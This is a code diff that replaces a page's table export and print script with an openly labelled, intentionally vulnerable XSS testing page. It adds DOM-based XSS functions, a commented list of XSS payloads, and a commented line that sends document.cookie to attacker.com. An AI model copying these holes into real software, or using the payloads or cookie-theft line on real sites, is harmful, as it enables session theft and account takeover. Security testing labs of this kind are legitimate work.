-                    </tr>
-            `;
-            
-            userData.forEach(item => {
-                const formattedDate = item.date ? new Date(item.date).toLocaleDateString('en-US') : '';
-                const formattedValue = new Intl.NumberFormat('en-US', {
-                    style: 'currency',
-                    currency: 'USD'
-                }).format(item.value);
-                
-                html += `
-                    <tr>
-                        <td>${item.name}</td>
-                        <td>${item.category}</td>
-                        <td>${formattedValue}</td>
-                        <td>${formattedDate}</td>
-                        <td>${item.status}</td>
-                    </tr>
-                `;
-            });
-            
-            html += `
-                </table>
-                </body></html>
-            `;
-            
-            // Open in new window for printing
-            const newWindow = window.open('', '_blank');
-            newWindow.document.write(html);
-            newWindow.document.close();
-            newWindow.focus();
-            
-            setTimeout(() => {
-                newWindow.print();
-            }, 250);
-        }
-        
-        function downloadFile(content, filename, type) {
-            const blob = new Blob([content], { type: type });
-            const link = document.createElement('a');
-            link.href = URL.createObjectURL(blob);
-            link.download = filename;
-            link.click();
-        }
-    </script>
+      }
+      
+      // Log to console
+      console.log('XSS payload executed. User input: ' + username);
+      return false;
+    }
+    
+    // VULNERABILITY 2: DOM-based XSS via location.hash
+    function showHashXSS() {
+      // DANGER: Direct insertion of URL hash without sanitization
+      var hash = location.hash.substring(1); // Get everything after #
+      if (hash) {
+        var outputDiv = document.getElementById('xssOutput');
+        // CRITICAL XSS VULNERABILITY
+        outputDiv.innerHTML = '<strong>URL Hash:</strong> ' + hash;
+      } else {
+        alert('Add #&lt;script&gt;alert(1)&lt;/script&gt; to the URL and click again');
+      }
+    }
+    
+    // VULNERABILITY 3: javascript: URI XSS
+    function showForgotMessage() {
+      // DOM-based XSS via href injection
+      var msg = prompt('Enter error message (XSS test):', 'Password reset');
+      if (msg) {
+        // DANGER: Creating anchor with javascript: URI
+        var link = document.createElement('a');
+        link.href = 'javascript:alert("' + msg + '")'; // XSS via javascript: URI
+        link.click();
+      }
+    }
+    
+    // VULNERABILITY 4: onclick XSS vector
+    function createAccountXSS() {
+      // DANGER: Injecting into onclick
+      var payload = prompt('Enter payload (test with: alert(document.cookie))', 'alert("XSS")');
+      if (payload) {
+        // CRITICAL: Dynamic script execution
+        setTimeout(payload, 100); // XSS via setTimeout string evaluation
+      }
+    }
+    
+    // VULNERABILITY 5: Additional XSS vectors
+    function docsXSS() {
+      // document.write XSS (classic)
+      document.write('<h1>XSS via document.write</h1><script>alert("document.write XSS")<\/script>');
+    }
+    
+    function contactXSS() {
+      // innerHTML injection
+      var div = document.createElement('div');
+      div.innerHTML = 'Support: <img src=x onerror=alert("Contact XSS")>';
+      document.body.appendChild(div);
+    }
+    
+    // ============== TEST FUNCTIONS ==============
+    function testXSS1() {
+      var output = document.getElementById('xssOutput');
+      output.innerHTML = '<div onload="alert(1)">XSS test 1</div>';
+    }
+    
+    function testXSS2() {
+      var output = document.getElementById('xssOutput');
+      output.innerHTML = '<img src="invalid" onerror="alert(\'Image XSS\')">';
+    }
+    
+    function testXSS3() {
+      var output = document.getElementById('xssOutput');
+      output.innerHTML = '<script>alert("Script XSS")<\/script>';
+    }
+    
+    function testXSS4() {
+      var output = document.getElementById('xssOutput');
+      output.innerHTML = '<svg/onload=alert("SVG XSS")>';
+    }
+    
+    // Auto-execute from URL hash (DOM-based XSS)
+    window.onload = function() {
+      // Check for hash payload
+      if (location.hash.length > 1) {
+        console.log('Hash detected: ' + location.hash);
+        // VULNERABLE: Don't do this in production!
+        // This is intentionally vulnerable for testing
+      }
+      
+      // Pre-populate with example if empty
+      if (!document.getElementById('login_field').value) {
+        // Uncomment to auto-fill test payload:
+        // document.getElementById('login_field').value = '<img src=x onerror=alert("Auto XSS")>';
+      }
+    };
+    
+    // VULNERABILITY 6: Cookie stealing simulation (educational)
+    function stealCookies() {
+      var cookies = document.cookie;
+      alert('[DEMO] Cookies would be sent to attacker: ' + cookies);
+      // In real attack: new Image().src = 'https://attacker.com/steal?c=' + cookies;
+    }
+    
+    console.log('XSS testing environment loaded - DO NOT USE IN PRODUCTION');
+  </script>
+  
+  <!-- Additional XSS vector: hidden iframe with javascript: -->
+  <iframe src="javascript:false" style="display:none"></iframe>
+  
+  <!-- Comment with XSS hint: 
+    Try these payloads:
+    - <script>alert('XSS')</script>
+    - <img src=x onerror=alert('XSS')>
+    - " onmouseover="alert('XSS')
+    - javascript:alert('XSS')
+    - <svg onload=alert('XSS')>
+    - ');alert('XSS');//
+    - <iframe src="javascript:alert('XSS')">
+  -->
+  
+  <div class="text-[11px] text-[#6e7781] mt-6">
+    ⚠️ XSS TEST BUILD - Intentionally vulnerable ⚠️
+  </div>
 </body>
 </html>
